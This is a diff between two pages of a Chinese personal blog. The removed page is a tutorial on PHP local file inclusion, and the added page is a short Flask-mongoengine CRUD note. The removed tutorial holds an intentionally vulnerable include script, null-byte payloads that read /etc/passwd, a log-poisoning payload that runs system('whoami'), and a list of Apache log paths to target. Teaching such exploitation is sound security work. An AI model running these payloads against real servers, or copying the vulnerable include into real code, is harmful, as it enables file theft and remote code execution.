@@ -5,62 +5,26 @@
   <meta http-equiv="X-UA-Compatible" content="chrome=1">
   
   <title>
-    PHP本地文件包含(LFI)漏洞利用 | Virink&#39;s Blog 
+    Flask-mongoengine 用法小記 | Virink&#39;s Blog 
   </title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
   <meta name="author" content="Virink">
 
 
-<meta name="description" content="0x00 案例
-参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf
-实验代码：
-&amp;lt;?php
-include($_GET[&apos;for&apos;].‘.php’);//用于测试本地包含漏洞
-?&amp;gt;
-
-Linux
-test.php?for=/etc/passwd%00
-
-Win
-test.php?for=D:\readme.txt%00
-
-Lo">
+<meta name="description" content="模型設置
+1234567891011121314151617181920212223242526272829303132from mongoengine.errors import ValidationErrorfrom mongoengine.queryset import (DoesNotExist, MultipleObjectsReturned)import flask_mongoengi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP本地文件包含(LFI)漏洞利用 | Virink's Blog">
-<meta property="og:url" content="https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html">
+<meta property="og:title" content="Flask-mongoengine 用法小記 | Virink's Blog">
+<meta property="og:url" content="https://www.virzz.com/2017/02/06/Flask-mongoengine 用法小記.html">
 <meta property="og:site_name" content="Virink's Blog">
-<meta property="og:description" content="0x00 案例
-参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf
-实验代码：
-&amp;lt;?php
-include($_GET[&apos;for&apos;].‘.php’);//用于测试本地包含漏洞
-?&amp;gt;
-
-Linux
-test.php?for=/etc/passwd%00
-
-Win
-test.php?for=D:\readme.txt%00
-
-Lo">
-<meta property="og:updated_time" content="2016-12-11T16:22:11.000Z">
+<meta property="og:description" content="模型設置
+1234567891011121314151617181920212223242526272829303132from mongoengine.errors import ValidationErrorfrom mongoengine.queryset import (DoesNotExist, MultipleObjectsReturned)import flask_mongoengi">
+<meta property="og:updated_time" content="2017-02-06T15:55:49.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP本地文件包含(LFI)漏洞利用 | Virink's Blog">
-<meta name="twitter:description" content="0x00 案例
-参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf
-实验代码：
-&amp;lt;?php
-include($_GET[&apos;for&apos;].‘.php’);//用于测试本地包含漏洞
-?&amp;gt;
-
-Linux
-test.php?for=/etc/passwd%00
-
-Win
-test.php?for=D:\readme.txt%00
-
-Lo">
+<meta name="twitter:title" content="Flask-mongoengine 用法小記 | Virink's Blog">
+<meta name="twitter:description" content="模型設置
+1234567891011121314151617181920212223242526272829303132from mongoengine.errors import ValidationErrorfrom mongoengine.queryset import (DoesNotExist, MultipleObjectsReturned)import flask_mongoengi">
 
   <!-- favicon icon files -->
 
@@ -169,16 +133,16 @@ Lo">
       
 <article class="post-container post-container--single">
   <header class="post-header">
-    <h1 class="post-title">PHP本地文件包含(LFI)漏洞利用</h1>
+    <h1 class="post-title">Flask-mongoengine 用法小記</h1>
     
     <div class="post-meta">
-      <time datetime="2016-10-16 12:29:29" class="post-meta__date date">2016-10-16 12:29:29</time> 
+      <time datetime="2017-02-06 23:39:15" class="post-meta__date date">2017-02-06 23:39:15</time> 
       <span class="post-meta__tags tags">
       
       
         &#8226; 标签:
         <font class="tags">
-        <a class="tags-link" href="/tags/php/">php</a>, <a class="tags-link" href="/tags/web/">web</a>
+        <a class="tags-link" href="/tags/flask/">flask</a>, <a class="tags-link" href="/tags/mongodb/">mongodb</a>, <a class="tags-link" href="/tags/python/">python</a>
         </font>
       
       </span>
@@ -186,86 +150,35 @@ Lo">
     
   </header>
   <section id="post-content" class="article-content post">
-  <h2>0x00 案例</h2>
-<p>参考资料：http://downloads.ackack.net/LocalFileInclusion.pdf</p>
-<p><strong>实验代码：</strong></p>
-<pre><code>&lt;?php
-include($_GET['for'].‘.php’);//用于测试本地包含漏洞
-?&gt;
-</code></pre>
-<h3>Linux</h3>
-<pre><code>test.php?for=/etc/passwd%00
-</code></pre>
-<h3>Win</h3>
-<pre><code>test.php?for=D:\readme.txt%00
-</code></pre>
-<h2>Log Injection</h2>
-<p>訪問任意頁面，問號後面寫payload，將payload寫入到log中，然後包含log文件執行payload。</p>
-<pre><code>test.php?&lt;php%20system('whoami');?&gt;
-</code></pre>
-<p>當然，需要服務器開啟日誌記錄功能。</p>
-<h2>DoFuck</h2>
-<pre><code>//linux
-test.php?for=/var/log/apache/logs/access_log%00
-//win
-test.php?for=..\apache\logs\access.log%00
-</code></pre>
-<h2>附录：可能的log路径</h2>
-<pre><code>/etc/httpd/logs/access.log
-/etc/httpd/logs/access_log
-/etc/httpd/logs/error.log
-/etc/httpd/logs/error_log
-/opt/lampp/logs/access_log
-/opt/lampp/logs/error_log
-/usr/local/apache/log
-/usr/local/apache/logs
-/usr/local/apache/logs/access.log
-/usr/local/apache/logs/access_log
-/usr/local/apache/logs/error.log
-/usr/local/apache/logs/error_log
-/usr/local/etc/httpd/logs/access_log
-/usr/local/etc/httpd/logs/error_log
-/usr/local/www/logs/thttpd_log
-/var/apache/logs/access_log
-/var/apache/logs/error_log
-/var/log/apache/access.log
-/var/log/apache/error.log
-/var/log/apache-ssl/access.log
-/var/log/apache-ssl/error.log
-/var/log/httpd/access_log
-/var/log/httpd/error_log
-/var/log/httpsd/ssl.access_log
-/var/log/httpsd/ssl_log
-/var/log/thttpd_log
-/var/www/log/access_log
-/var/www/log/error_log
-/var/www/logs/access.log
-/var/www/logs/access_log
-/var/www/logs/error.log
-/var/www/logs/error_log
-C:\apache\logs\access.log
-C:\apache\logs\error.log
-C:\Program Files\Apache Group\Apache\logs\access.log
-C:\Program Files\Apache Group\Apache\logs\error.log
-C:\program files\wamp\apache2\logs
-C:\wamp\apache2\logs
-C:\wamp\logs
-C:\xampp\apache\logs\access.log
-C:\xampp\apache\logs\error.log
-</code></pre>
+  <h2>模型設置</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> mongoengine.errors <span class="keyword">import</span> ValidationError</div><div class="line"><span class="keyword">from</span> mongoengine.queryset <span class="keyword">import</span> (DoesNotExist, MultipleObjectsReturned)</div><div class="line"><span class="keyword">import</span> flask_mongoengine</div><div class="line"></div><div class="line">db = app.db</div><div class="line"></div><div class="line"><span class="comment"># 自定義定義BaseQuerySet添加_get方法</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseQuerySet</span><span class="params">(flask_mongoengine.BaseQuerySet)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self, *args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">print</span> args, kwargs</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self.get(*args, **kwargs)</div><div class="line">        <span class="keyword">except</span> (MultipleObjectsReturned, DoesNotExist, ValidationError):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="comment"># 重寫 Document 父類</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Document</span><span class="params">(db.Document)</span>:</span></div><div class="line">    meta = &#123;<span class="string">'abstract'</span>: <span class="keyword">True</span>,</div><div class="line">            <span class="string">'queryset_class'</span>: BaseQuerySet&#125;</div><div class="line"></div><div class="line"><span class="comment"># Users模型</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Users</span><span class="params">(Document)</span>:</span></div><div class="line">    username = db.StringField(unique=<span class="keyword">True</span>)</div><div class="line">    password = db.StringField()</div><div class="line">    email = db.StringField(unique=<span class="keyword">True</span>)</div><div class="line">    info = db.StringField()</div><div class="line">    website = db.StringField()</div><div class="line">    code = db.StringField(unique=<span class="keyword">True</span>)</div><div class="line">    role = db.IntField(default=<span class="number">0</span>)</div><div class="line">    verified = db.BooleanField(default=<span class="keyword">False</span>)</div><div class="line">    ban = db.BooleanField(default=<span class="keyword">False</span>)</div><div class="line">    date = db.DateTimeField(default=datetime.datetime.now())</div></pre></td></tr></table></figure>
+<h2>增刪改查</h2>
+<h3>添加數據</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">user = Users(username=username,password=password [,**data])</div><div class="line">user.email = email</div><div class="line"><span class="comment"># ...</span></div><div class="line">user.save()</div><div class="line"></div><div class="line"><span class="comment"># or</span></div><div class="line"></div><div class="line">Users(username=username,password=password [,**data]).save()</div></pre></td></tr></table></figure>
+<h3>修改數據</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">user = Users.objects._get(username=username)</div><div class="line"><span class="keyword">if</span> user:</div><div class="line">    user.password = <span class="string">'new password'</span></div><div class="line">    user.save()</div><div class="line">    <span class="comment"># or</span></div><div class="line">    user.update() <span class="comment"># 這個用法我不懂哇</span></div></pre></td></tr></table></figure>
+<h3>刪除數據</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user = Users.objects._get(username=username,password=password [, **data])</div><div class="line"><span class="keyword">if</span> user:</div><div class="line">    user.delete()</div></pre></td></tr></table></figure>
+<h3>查詢數據</h3>
+<pre><code class="language-python"># 列出所有數據
+user = Users.objects.all()
+# 條件查詢
+user = Users.objects._get(username=username [,**data])
+if user:
+    print user.password</code></pre>
 
   </section>
   <div class="copyright">
-    <span>文本標題:</span><a href="/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html" target="_blank">PHP本地文件包含(LFI)漏洞利用</a><br />
+    <span>文本標題:</span><a href="/2017/02/06/Flask-mongoengine 用法小記.html" target="_blank">Flask-mongoengine 用法小記</a><br />
     <span>文章作者:</span><a href="/" title="回到主页" target="_blank">Virink</a><br />
-    <span>發佈時間:</span>2016-10-16 12:29:29<br />
-    <span>最後更新:</span>2016-12-12 00:22:11<br />
-    <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html" title="PHP本地文件包含(LFI)漏洞利用" target="_blank">https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html</a><br />
+    <span>發佈時間:</span>2017-02-06 23:39:15<br />
+    <span>最後更新:</span>2017-02-06 23:55:49<br />
+    <span>原始鏈接:</span><a class="post-url" href="https://www.virzz.com/2017/02/06/Flask-mongoengine 用法小記.html" title="Flask-mongoengine 用法小記" target="_blank">https://www.virzz.com/2017/02/06/Flask-mongoengine 用法小記.html</a><br />
     <span>轉載聲明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
   </div>
   
 <section class="post-comments">
-    <div class="ds-thread" data-thread-key="2016/10/16/PHP本地文件包含(LFI)漏洞利用.html" data-title="PHP本地文件包含(LFI)漏洞利用" data-url="https://www.virzz.com/2016/10/16/PHP本地文件包含(LFI)漏洞利用.html"></div>
+    <div class="ds-thread" data-thread-key="2017/02/06/Flask-mongoengine 用法小記.html" data-title="Flask-mongoengine 用法小記" data-url="https://www.virzz.com/2017/02/06/Flask-mongoengine 用法小記.html"></div>
     <script type="text/javascript">
     var duoshuoQuery = {short_name:"virink"};
       (function() {
